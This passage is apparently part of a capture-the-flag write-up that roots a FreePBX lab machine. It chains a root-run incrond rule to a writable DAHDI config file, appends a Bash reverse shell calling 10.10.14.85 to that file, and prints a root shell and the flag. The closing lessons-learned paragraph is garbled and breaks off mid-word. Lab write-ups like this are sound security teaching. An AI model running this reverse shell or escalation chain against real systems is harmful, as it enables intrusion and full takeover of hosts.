**Results:**

```shell
sudo: no tty present and no askpass program specified
[asterisk@connected ~]$ ps aux
ps aux
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.1 125512  5368 ?        Ss   Jun16   0:04 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
root          2  0.0  0.0      0     0 ?        S    Jun16   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        I<   Jun16   0:00 [rcu_gp]
root          4  0.0  0.0      0     0 ?        I<   Jun16   0:00 [rcu_par_gp]
root          6  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kworker/0:0H-kb]
root          8  0.0  0.0      0     0 ?        I<   Jun16   0:00 [mm_percpu_wq]
root          9  0.0  0.0      0     0 ?        S    Jun16   0:00 [ksoftirqd/0]
root         10  0.1  0.0      0     0 ?        I    Jun16   0:20 [rcu_sched]
root         11  0.0  0.0      0     0 ?        S    Jun16   0:00 [migration/0]
root         13  0.0  0.0      0     0 ?        S    Jun16   0:00 [cpuhp/0]
root         14  0.0  0.0      0     0 ?        S    Jun16   0:00 [cpuhp/1]
root         15  0.0  0.0      0     0 ?        S    Jun16   0:00 [migration/1]
root         16  0.0  0.0      0     0 ?        S    Jun16   0:00 [ksoftirqd/1]
root         18  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kworker/1:0H-kb]
root         19  0.0  0.0      0     0 ?        S    Jun16   0:00 [kdevtmpfs]
root         20  0.0  0.0      0     0 ?        I<   Jun16   0:00 [netns]
root         21  0.0  0.0      0     0 ?        S    Jun16   0:01 [kauditd]
root         25  0.0  0.0      0     0 ?        S    Jun16   0:00 [khungtaskd]
root         26  0.0  0.0      0     0 ?        S    Jun16   0:00 [oom_reaper]
root         27  0.0  0.0      0     0 ?        I<   Jun16   0:00 [writeback]
root         28  0.0  0.0      0     0 ?        S    Jun16   0:00 [kcompactd0]
root         29  0.0  0.0      0     0 ?        SN   Jun16   0:00 [ksmd]
root         30  0.0  0.0      0     0 ?        SN   Jun16   0:00 [khugepaged]
root         81  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kintegrityd]
root         82  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kblockd]
root         83  0.0  0.0      0     0 ?        I<   Jun16   0:00 [blkcg_punt_bio]
root         84  0.0  0.0      0     0 ?        I<   Jun16   0:00 [tpm_dev_wq]
root         85  0.0  0.0      0     0 ?        I<   Jun16   0:00 [md]
root         86  0.0  0.0      0     0 ?        I<   Jun16   0:00 [edac-poller]
root         87  0.0  0.0      0     0 ?        I<   Jun16   0:00 [devfreq_wq]
root         88  0.0  0.0      0     0 ?        S    Jun16   0:00 [watchdogd]
root         89  0.0  0.0      0     0 ?        S    Jun16   0:00 [kswapd0]
root         91  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kthrotld]
root         92  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/24-pciehp]
root         93  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/25-pciehp]
root         94  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/26-pciehp]
root         95  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/27-pciehp]
root         96  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/28-pciehp]
root         97  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/29-pciehp]
root         98  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/30-pciehp]
root         99  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/31-pciehp]
root        100  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/32-pciehp]
root        101  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/33-pciehp]
root        102  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/34-pciehp]
root        103  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/35-pciehp]
root        104  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/36-pciehp]
root        105  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/37-pciehp]
root        106  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/38-pciehp]
root        107  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/39-pciehp]
root        108  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/40-pciehp]
root        109  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/41-pciehp]
root        110  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/42-pciehp]
root        111  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/43-pciehp]
root        112  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/44-pciehp]
root        113  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/45-pciehp]
root        114  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/46-pciehp]
root        115  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/47-pciehp]
root        116  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/48-pciehp]
root        117  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/49-pciehp]
root        118  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/50-pciehp]
root        119  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/51-pciehp]
root        120  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/52-pciehp]
root        121  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/53-pciehp]
root        122  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/54-pciehp]
root        123  0.0  0.0      0     0 ?        S    Jun16   0:00 [irq/55-pciehp]
root        124  0.0  0.0      0     0 ?        I<   Jun16   0:00 [acpi_thermal_pm]
root        125  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kmpath_rdacd]
root        126  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kaluad]
root        128  0.0  0.0      0     0 ?        I<   Jun16   0:00 [ipv6_addrconf]
root        129  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kstrp]
root        140  0.0  0.0      0     0 ?        I<   Jun16   0:00 [charger_manager]
root        357  0.0  0.0      0     0 ?        I<   Jun16   0:00 [mpt_poll_0]
root        358  0.0  0.0      0     0 ?        I<   Jun16   0:00 [ata_sff]
root        359  0.0  0.0      0     0 ?        I<   Jun16   0:00 [mpt/0]
root        360  0.0  0.0      0     0 ?        S    Jun16   0:00 [scsi_eh_0]
root        361  0.0  0.0      0     0 ?        I<   Jun16   0:00 [scsi_tmf_0]
root        362  0.0  0.0      0     0 ?        S    Jun16   0:00 [scsi_eh_1]
root        363  0.0  0.0      0     0 ?        I<   Jun16   0:00 [scsi_tmf_1]
root        365  0.0  0.0      0     0 ?        S    Jun16   0:01 [irq/16-vmwgfx]
root        366  0.0  0.0      0     0 ?        I<   Jun16   0:00 [ttm_swap]
root        379  0.0  0.0      0     0 ?        S    Jun16   0:00 [scsi_eh_2]
root        380  0.0  0.0      0     0 ?        I<   Jun16   0:00 [scsi_tmf_2]
root        383  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kworker/0:1H-kb]
root        445  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kdmflush]
root        456  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kdmflush]
root        468  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfsalloc]
root        469  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs_mru_cache]
root        470  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-buf/dm-0]
root        471  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-conv/dm-0]
root        472  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-cil/dm-0]
root        473  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-reclaim/dm-]
root        474  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-eofblocks/d]
root        475  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-log/dm-0]
root        476  0.0  0.0      0     0 ?        S    Jun16   0:07 [xfsaild/dm-0]
root        477  0.0  0.0      0     0 ?        I<   Jun16   0:00 [kworker/1:1H-xf]
root        564  0.0  0.1  39088  7800 ?        Ss   Jun16   0:01 /usr/lib/systemd/systemd-journald
root        587  0.0  0.0 190384  2764 ?        Ss   Jun16   0:00 /usr/sbin/lvmetad -f
root        592  0.0  0.1  48004  5796 ?        Ss   Jun16   0:00 /usr/lib/systemd/systemd-udevd
root        618  0.0  0.0      0     0 ?        I<   Jun16   0:00 [cryptd]
root        685  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-buf/sda1]
root        686  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-conv/sda1]
root        687  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-cil/sda1]
root        688  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-reclaim/sda]
root        689  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-eofblocks/s]
root        690  0.0  0.0      0     0 ?        I<   Jun16   0:00 [xfs-log/sda1]
root        691  0.0  0.0      0     0 ?        S    Jun16   0:00 [xfsaild/sda1]
root        706  0.0  0.0  55540  2448 ?        S<sl Jun16   0:03 /sbin/auditd
root        708  0.0  0.0  84564  1880 ?        S<sl Jun16   0:03 /sbin/audispd
_laurel     712  0.0  0.1  27440  5552 ?        S<   Jun16   0:07 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root        728  0.0  0.0      0     0 ?        S    Jun16   0:00 [audit_prune_tre]
root        733  0.0  0.0  21688  2940 ?        Ss   Jun16   0:02 /usr/sbin/irqbalance --foreground
root        734  0.0  0.1  90576  5588 ?        Ss   Jun16   0:00 /sbin/rngd -f
root        735  0.0  0.2 228388  9304 ?        Ss   Jun16   0:00 /usr/sbin/abrtd -d -s
root        736  0.0  0.2 225864  8528 ?        Ss   Jun16   0:00 /usr/bin/abrt-watch-log -F BUG: WARNING: at WARNING: CPU: INFO: possible recursive locking detected ernel BUG at list_del corruption list_add corruption do_IRQ: stack overflow: ear stack overflow (cur: eneral protection fault nable to handle kernel ouble fault: RTNL: assertion failed eek! page_mapcount(page) went negative! adness at NETDEV WATCHDOG ysctl table check failed : nobody cared IRQ handler type mismatch Kernel panic - not syncing: Machine Check Exception: Machine check events logged divide error: bounds: coprocessor segment overrun: invalid TSS: segment not present: invalid opcode: alignment check: stack segment: fpu exception: simd exception: iret exception: /var/log/messages -- /usr/bin/abrt-dump-oops -xtD
avahi       737  0.0  0.1  62172  4100 ?        Ss   Jun16   0:00 avahi-daemon: running [connected.local]
polkitd     740  0.0  0.5 615108 21392 ?        Ssl  Jun16   0:00 /usr/lib/polkit-1/polkitd --no-debug
root        743  0.0  0.2  99696 10396 ?        Ss   Jun16   0:00 /usr/bin/VGAuthService -s
root        744  0.0  0.2 313764 11484 ?        Ssl  Jun16   0:18 /usr/bin/vmtoolsd
root        748  0.0  0.1  52880  5016 ?        Ss   Jun16   0:00 /usr/sbin/smartd -n -q never
root        752  0.0  0.0  26392  3052 ?        Ss   Jun16   0:01 /usr/lib/systemd/systemd-logind
avahi       756  0.0  0.0  62172   388 ?        S    Jun16   0:00 avahi-daemon: chroot helper
chrony      758  0.0  0.0 117816  3168 ?        S    Jun16   0:00 /usr/sbin/chronyd -f /etc/sangoma_chrony.conf
root        761  0.0  0.0  15044  2784 ?        Ss   Jun16   0:00 /usr/sbin/incrond
libstor+    765  0.0  0.0   8588  1680 ?        Ss   Jun16   0:00 /usr/bin/lsmd -d
dbus        768  0.0  0.1  60340  4464 ?        Ss   Jun16   0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        827  0.0  0.8 358836 34736 ?        Ssl  Jun16   0:01 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid
root        850  0.0  0.0      0     0 ?        I<   Jun16   0:00 [cfg80211]
root        868  0.0  0.3 547976 13424 ?        Ssl  Jun16   0:01 /usr/sbin/NetworkManager --no-daemon
root        973  0.0  0.2 102912  9152 ?        S    Jun16   0:00 /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-eth0.pid -lf /var/lib/NetworkManager/dhclient-1634588d-2dd3-4ad3-b967-d14777c9f613-eth0.lease -cf /var/lib/NetworkManager/dhclient-eth0.conf eth0
root       1162  0.0  0.1 112932  7568 ?        Ss   Jun16   0:00 /usr/sbin/sshd -D
root       1168  0.0  0.5 574312 22048 ?        Ssl  Jun16   0:03 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
redis      1169  0.1  0.2 143064  8764 ?        Ssl  Jun16   0:26 /usr/bin/redis-server 127.0.0.1:6379
root       1171  0.0  0.2 222772  9216 ?        Ssl  Jun16   0:02 /usr/sbin/rsyslogd -n
root       1180  0.0  0.8 522300 33996 ?        Ss   Jun16   0:01 /usr/sbin/httpd -DFOREGROUND
root       1193  0.0  0.0  27176  2304 ?        Ss   Jun16   0:00 /usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd.pid
root       1195  0.0  0.0  25916  2156 ?        Ss   Jun16   0:00 /usr/sbin/atd -f
root       1208  0.0  0.0 126424  3216 ?        Ss   Jun16   0:00 /usr/sbin/crond -n
root       1231  0.0  0.0 110212  1888 tty1     Ss+  Jun16   0:00 /sbin/agetty --noclear tty1 linux
mysql      1261  0.0  0.0 113420  3136 ?        Ss   Jun16   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
root       1318  0.0  0.0 115412  2348 ?        S    Jun16   0:00 /bin/sh /usr/sbin/safe_asterisk
asterisk   1339  1.1  1.9 2196892 77176 ?       Sl   Jun16   3:41 /usr/sbin/asterisk -f -vvvg -c
root       1427  0.0  0.8 267684 35316 ?        S    Jun16   0:03 /usr/bin/python3.6 -m aiohttp.web aiovega.web:app_factory -H 127.0.0.1 -P 4000
mongodb    1435  0.5  1.4 477840 58040 ?        Sl   Jun16   1:54 /usr/bin/mongod --quiet -f /etc/mongod.conf run
mysql      1489  0.2  2.9 1234692 117340 ?      Sl   Jun16   0:42 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
root       1608  0.0  0.1  91796  4920 ?        Ss   Jun16   0:00 /usr/libexec/postfix/master -w
postfix    1616  0.0  0.1  91968  6676 ?        S    Jun16   0:00 qmgr -l -t unix -u
asterisk   1764  0.0  0.3 198360 12028 ?        Ss   Jun16   0:00 /usr/bin/python /usr/local/bin/pnp_server
root       5824  0.0  0.0      0     0 ?        I    00:20   0:00 [kworker/u256:2-]
asterisk  16507  0.0  0.9 638780 39676 ?        S    03:08   0:00 /usr/sbin/httpd -DFOREGROUND
asterisk  16508  0.0  0.9 634808 36584 ?        S    03:08   0:00 /usr/sbin/httpd -DFOREGROUND
asterisk  16509  0.0  1.0 640960 42796 ?        S    03:08   0:00 /usr/sbin/httpd -DFOREGROUND
asterisk  16510  0.0  1.0 638912 40664 ?        S    03:08   0:00 /usr/sbin/httpd -DFOREGROUND
asterisk  16511  0.0  1.0 638888 40688 ?        S    03:08   0:00 /usr/sbin/httpd -DFOREGROUND
root      19010  0.0  0.0      0     0 ?        I    03:53   0:01 [kworker/0:2-cgr]
asterisk  19207  0.0  1.0 638912 40668 ?        S    03:55   0:00 /usr/sbin/httpd -DFOREGROUND
root      19821  0.0  0.1 184592  4512 ?        S    04:05   0:00 /usr/sbin/CROND -n
asterisk  19824  0.0  0.0      0     0 ?        Zs   04:05   0:00 [sh] <defunct>
asterisk  19856  0.0  0.1 116212  4152 ?        S    04:05   0:00 bash -i
root      20208  0.0  0.0      0     0 ?        I    04:09   0:00 [kworker/1:0-mm_]
postfix   20829  0.0  0.1  91900  6532 ?        S    04:15   0:00 pickup -l -t unix -u
root      20894  0.0  0.0      0     0 ?        I    04:16   0:00 [kworker/1:2-cgr]
root      21163  0.0  0.0      0     0 ?        I    04:18   0:00 [kworker/0:0-cgr]
root      21517  0.0  0.0      0     0 ?        I    04:21   0:00 [kworker/u256:1]
root      21613  0.0  0.0      0     0 ?        I    04:22   0:00 [kworker/1:1-cgr]
root      21931  0.0  0.0      0     0 ?        I    04:25   0:00 [kworker/0:1-mpt]
root      22437  0.0  0.0      0     0 ?        I    04:29   0:00 [kworker/1:3-eve]
asterisk  22907  0.0  0.5 524384 20528 ?        S    04:32   0:00 /usr/sbin/httpd -DFOREGROUND
root      22910  0.0  0.1 184592  4528 ?        S    04:33   0:00 /usr/sbin/CROND -n
asterisk  22913  0.0  0.0 113288  2820 ?        Ss   04:33   0:00 /bin/sh -c [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole job --run --quiet 2>&1 > /dev/null
asterisk  22914  1.7  1.5 470348 61660 ?        S    04:33   0:00 php /usr/sbin/fwconsole job --run --quiet
asterisk  23021  0.0  0.0 155480  3828 ?        R    04:33   0:00 ps aux
[asterisk@connected ~]$ 
```

**Key Finding:**

```shell
root        761  0.0  0.0  15044  2784 ?        Ss   Jun16   0:00 /usr/sbin/incrond
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 ==What's `incrond`==

`incrond` is running as root. Unlike cron, which executes commands on a time schedule, `incrond` executes commands in response to filesystem events — such as a file being written to or closed. If any file that asterisk can write to is being watched by a root-owned `incrond` rule, writing to that file becomes a direct root code execution primitive. This warranted immediate investigation.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc

#### 5.1 Enumerating `incrond` Rules

Read the `incrond` system-wide rule tables were read to identify what filesystem paths are being watched and what commands fire when they are triggered:

**Command:** `cat /etc/incron.d/*`

**Breakdown:**

- `cat`
	- Description: Reads and prints file contents to standard output.
	- Purpose: Displays every rule registered in the system-wide incron table directory in a single pass.
- `/etc/incron.d/*`
	- Description: A glob that expands to every file inside /etc/incron.d/.
	- Purpose: System-wide incron rules — those that apply to all users and run as root — live here, as opposed to per-user tables in /var/spool/incron/. Reading all files in one command ensures no rule file is missed.

**Result:**

```shell
[asterisk@connected ~]$ cat /etc/incron.d/*
cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
[asterisk@connected ~]$ 
```

**Key Finding:** 

The rule `/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart` instructs the root-run `incrond` daemon to execute `/usr/sbin/sysadmin_dahdi_restart` as root any time the file `/var/spool/asterisk/sysadmin/dahdi_restart` is closed after being written to. The permissions on that watched file is what we want to check next.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

#### 5.2 Checking the Trigger File

**Command:** `ls -la /var/spool/asterisk/sysadmin/dahdi_restart`

**Result:**

```shell
[asterisk@connected ~]$ ls -la /var/spool/asterisk/sysadmin/dahdi_restart
ls -la /var/spool/asterisk/sysadmin/dahdi_restart
-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 /var/spool/asterisk/sysadmin/dahdi_restart
[asterisk@connected ~]$ 
```

The file is owned by asterisk:asterisk with group-write permission — the current session can write to it directly, meaning the root incron rule can be triggered on demand.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

#### 5.3 Tracing the Triggered Script

Writing to the trigger file executes /usr/sbin/sysadmin_dahdi_restart as root, but that script is root-owned and cannot be modified. The script was read to determine whether it calls or sources anything the asterisk account can control:

**Command:** `cat /usr/sbin/sysadmin_dahdi_restart`

**Result:**

```shell
-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 /var/spool/asterisk/sysadmin/dahdi_restart
[asterisk@connected ~]$ cat /usr/sbin/sysadmin_dahdi_restart
cat /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh

/etc/init.d/asterisk stop

sleep 5

/etc/init.d/dahdi restart

sleep 5

export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
[asterisk@connected ~]$ 
```

The script calls `/etc/init.d/dahdi restart`. Inspect the init script for any source directives pointing to externally-editable files:

**Command:** `grep -n 'source\|\. /\|init.conf' /etc/init.d/dahdi`

**Breakdown:**

- `grep`
	- Description: Searches file contents for lines matching a pattern.
	- Purpose: Scans the DAHDI init script for any line that reads and executes an external file — a source or . directive is the critical pattern, since it means the referenced file's contents execute with the same privilege level as the calling script.
- `-n`
	- Description: Prefixes each matching line with its line number.
	- Purpose: Pinpoints exactly where in the script the sourcing occurs for precise analysis.
- `'source\|\. /\|init.conf'`
	- Description: Matches lines containing source, . / (the POSIX dot operator followed by a path), or the string init.conf.
	- Purpose: Catches all common forms of file-sourcing in shell scripts in a single pattern.

**Result:**

```shell
[asterisk@connected ~]$ grep -n 'source\|\. /\|init.conf' /etc/init.d/dahdi
grep -n 'source\|\. /\|init.conf' /etc/init.d/dahdi
9:# config: /etc/dahdi/init.conf
25:# Don't edit the following values. Edit /etc/dahdi/init.conf instead.
69:[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
[asterisk@connected ~]$ 
```


**Key finding:** 

line 69 — `[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf` — uses the POSIX dot operator (. ) to source `/etc/dahdi/init.conf` directly into the running shell. Because this script is called as root via the incron chain, any shell commands written into `init.conf` execute as root. The comment on line 25 even explicitly directs administrators to edit this file — making it an intended customization point that doubles as an attacker-controlled code execution path if its ownership is misconfigured.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

#### 5.4 Confirming init.conf is Writable

**Command:** `ls -la /etc/dahdi/init.conf`

**Result:**

```shell
[asterisk@connected ux392lu70m]$ ls -la /etc/dahdi/init.conf
ls -la /etc/dahdi/init.conf
-rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf
[asterisk@connected ux392lu70m]$ 
```

`/etc/dahdi/init.conf` is owned by `asterisk:asterisk` — the current session has full write access. The complete privilege escalation chain is now confirmed:

> `incrond` runs as root → watches `/var/spool/asterisk/sysadmin/dahdi_restart` (asterisk-writable) → triggers `/usr/sbin/sysadmin_dahdi_restart` as root → calls `/etc/init.d/dahdi restart` → sources `/etc/dahdi/init.conf` as root → `init.conf` is asterisk-writable → appending a reverse shell to `init.conf` and writing to the trigger file produces a root shell on demand.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.5 Executing the Privilege Escalation

Start a second listener on a separate port to keep the root shell cleanly separated from the existing asterisk session on port `4444`:

**Command:** `nc -lvnp 4446`

**Breakdown:**

- `-lvnp 4446`
  - Description: Same flags as the initial listener — listen, verbose, no DNS, on the specified port.
  - Purpose: Port 4446 is used rather than reusing 4444 to avoid conflicting with the active asterisk shell and to keep the two phases of the engagement clearly separated in the evidence trail.

Append the reverse shell payload to the writable, root-sourced configuration file:

**Command:** `echo 'bash -c "bash -i >& /dev/tcp/10.10.14.85/4446 0>&1" &' >> /etc/dahdi/init.conf`

**Breakdown:**

- `echo '...'`
	- Description: Prints the supplied string to standard output.
	- Purpose: Generates the exact reverse shell one-liner to be written into the configuration file.
- `bash -c "bash -i >& /dev/tcp/10.10.14.85/4446 0>&1"`
	- Description: A Bash TCP reverse shell one-liner. `-i` opens an interactive shell; `>&` redirects both stdout and stderr over a TCP connection to the attacker's IP and port.
	- Purpose: When executed as root by the sourcing chain, this opens a root interactive shell back to the waiting listener.
- `&`
  - Description: Backgrounds the reverse shell process.
	- Purpose: Ensures the reverse shell does not block the rest of the DAHDI init script from completing — without it, the parent process could time out or be killed before the connection is established.
- `>> /etc/dahdi/init.conf`
	- Description: Appends standard output to the file without overwriting existing content.
	- Purpose: Preserves the original configuration directives in init.conf so the DAHDI service continues to function normally, and places the payload on its own new line at the end.

**Result:**

```shell
[asterisk@connected ghw5bmugvs]$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.85/4446 0>&1" &' >> /etc/dahdi/init.conf
<-i >& /dev/tcp/10.10.14.85/4446 0>&1" &' >> /etc/dahdi/init.conf            
[asterisk@connected ghw5bmugvs]$ 
```

**Command:** `echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart`

**Breakdown:**
- `echo trigger`
	- Description: Writes the string `trigger` to standard output.
	- Purpose: Any write followed by a file close is sufficient to fire the `IN_CLOSE_WRITE` incron event — the content itself is irrelevant.
- `> /var/spool/asterisk/sysadmin/dahdi_restart`
	- Description: Redirects standard output into the watched file, overwriting its contents and then closing the file handle.
	- Purpose: The file close-after-write event is precisely what the root incron rule subscribes to — this single redirect is the deliberate trigger that fires the entire privileged execution chain.

**Result:**

```shell
[asterisk@connected ghw5bmugvs]$ echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart
<gvs]$ echo trigger > /var/spool/asterisk/sysadmin/dahdi_restart             
[asterisk@connected ghw5bmugvs]$ 
```

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ nc -lvnp 4446
listening on [any] 4446 ...
connect to [10.10.14.85] from (UNKNOWN) [10.129.245.100] 48534
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                            
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                             
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                             
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                            
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                            
                                                                                          
                                                                                          
NOTICE! You have 3 notifications! Please log into the UI to see them!                     
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:1E:70:1F | 10.129.245.100            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[root@connected /]# 
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.6 Root Flag

```shell
[root@connected /]# find / -name root.txt 2>/dev/null
find / -name root.txt 2>/dev/null
/root/root.txt
[root@connected /]# cat /root/root.txt
cat /root/root.txt
ffe5bd2259added2a1f041dad2232a95
[root@connected /]# 
```

**ROOT FLAG:** `ffe5bd2259added2a1f041dad2232a95`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
 
 1. Version strings on unauthenticated pages are the fastest path to a CVE.
	 FreePBX's load_version=16.0.40.7 query parameter appeared on every static asset URL and the footer text confirmed it a second time — all before a single login attempt. In practice, always grep page source and asset URLs for version strings before reaching for slower fingerprinting techniques. Frameworks routinely leak their own version this way, and a confirmed version number converts a generic "web app" target into a searchable CVE within seconds.

2. Read a PoC before running it — detection tools and attack tools look identical from the outside.
	The watchTowr script and the 0xEhab script both exploit the same CVE, but one cleans up after itself and leaves no shell while the other delivers persistent access. Running the wrong one would have wasted time and left injection artifacts in the database without a usable foothold. Decoding the base64 payload locally first (base64 -d) confirmed the technique was sound and identified which tool was purpose-built for offense.

3. incrond is a blind spot in most privesc checklists.
	/etc/cron.d, crontab -l, and sudo -l are reflexive checks that most people run immediately. /etc/incron.d/ is checked far less often, yet a root-run incrond watching an attacker-writable file is just as exploitable as a root cron job calling a writable script. On any box where standard cron checks come up empty, ps aux | grep incrond and cat /etc/incron.d/* should be the immediate next step.

4. Privilege escalation chains are assembled from individually reasonable-looking pieces.
	No single component of this privesc was independently alarming. A file-watching daemon running as root for legitimate operational reasons, a restart script that sources an external config file for legitimate administrator convenience, and loose file ownership on both — none of these facts alone would raise a red flag in a code review. It was the combination that produced fullivesc hunting means mapping allautomation surfaces and askingo can write to that?" ratherthan searching for a single ob

